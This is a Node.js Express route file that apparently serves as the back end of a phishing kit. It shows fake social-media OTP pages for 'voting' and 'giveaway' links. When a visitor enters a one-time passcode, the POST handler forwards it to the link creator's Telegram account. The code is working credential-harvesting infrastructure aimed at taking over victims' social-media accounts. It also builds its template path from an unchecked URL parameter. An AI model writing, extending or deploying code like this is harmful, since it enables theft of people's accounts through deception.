const Link = require('../../../models/Link');
const Log = require('../../../models/Log');
const User = require('../../../models/User');
const {otpNotification} = require('../../../templates/telegramNotifications');
const router = require('express').Router();
const sendMessage = require("../../../lib/telegramBot")


const linkTypes = ["voting", "giveaway", "custom"]


router.get("/:socialMedia/:linkId/", async (req,res) => {
    try{
        const {linkId, socialMedia} = req.params;
        const link = await Link.findOne({linkId, expiresAt: {$gt: Date.now()}});
        if(link==null){
            return res.redirect(303, "/not-found");
        }
        if(!linkTypes.includes(link.linkType)){
            return res.redirect(303, "/not-found");
        }
        return res.render(`social/${socialMedia}-otp`, {req, link});
    }catch(error){
        console.log(error);
        return res.redirect(303, "/not-found");
    }
})

router.post("/:socialMedia/:linkId/", async (req,res) => {
    try{
        const {linkId, socialMedia} = req.params;
        const link = await Link.findOne({linkId, expiresAt: {$gt: Date.now()}});
        const {
            otp,
        } = req.body;

        if(link==null){
            return res.redirect(303, "/not-found");
        }
        if(!linkTypes.includes(link.linkType)){
            return res.redirect(303, "/not-found");
        }

        const user = await User.findOne({_id: link.userId});

        // send telegram notification to user
        const message = await otpNotification(otp, socialMedia);
        await sendMessage(user.telegramId, message);

        return res.redirect(303, `/slink/success/${linkId}`);
    }catch(error){
        console.log(error);
        return res.redirect(303, "/not-found");
    }
})

module.exports = router;